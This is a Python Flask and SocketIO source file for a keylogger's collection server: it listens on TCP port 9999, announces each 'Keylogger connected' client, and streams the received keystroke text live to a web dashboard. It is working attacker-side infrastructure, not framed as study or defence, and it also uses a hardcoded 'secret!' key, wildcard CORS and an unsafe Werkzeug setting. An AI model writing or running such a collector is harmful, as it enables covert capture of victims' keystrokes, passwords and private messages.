from flask import Flask, render_template
from flask_socketio import SocketIO
import socket
import threading

# =========================
# Flask App Configuration
# =========================
app = Flask(__name__)
app.config["SECRET_KEY"] = "secret!"

socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode="threading"
)

# =========================
# Routes
# =========================
@app.route("/")
def index():
    return render_template("index.html")


# =========================
# TCP Listener
# =========================
def tcp_listener():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Prevent "Address already in use" after restarting
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    server_socket.bind(("0.0.0.0", 9999))
    server_socket.listen(5)

    print("[*] Monitoring server listening on port 9999...")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"[+] Keylogger connected: {addr}")

        threading.Thread(
            target=handle_client,
            args=(client_socket,),
            daemon=True
        ).start()


def handle_client(client_socket):
    with client_socket:
        try:
            while True:
                data = client_socket.recv(1024)

                if not data:
                    break

                message = data.decode("utf-8", errors="ignore").strip()

                if message:
                    print("[LOG]", message)

                    socketio.emit(
                        "new_log",
                        {"data": message}
                    )

        except Exception as e:
            print("[!] Client Error:", e)

        finally:
            print("[*] Client disconnected")


# =========================
# Start TCP Listener
# =========================
listener_thread = threading.Thread(
    target=tcp_listener,
    daemon=True
)
listener_thread.start()


# =========================
# Run Server
# =========================
if __name__ == "__main__":
    print("[*] Starting Flask Monitoring Server...")

    socketio.run(
        app,
        host="0.0.0.0",
        port=5000,
        debug=False,
        allow_unsafe_werkzeug=True
    )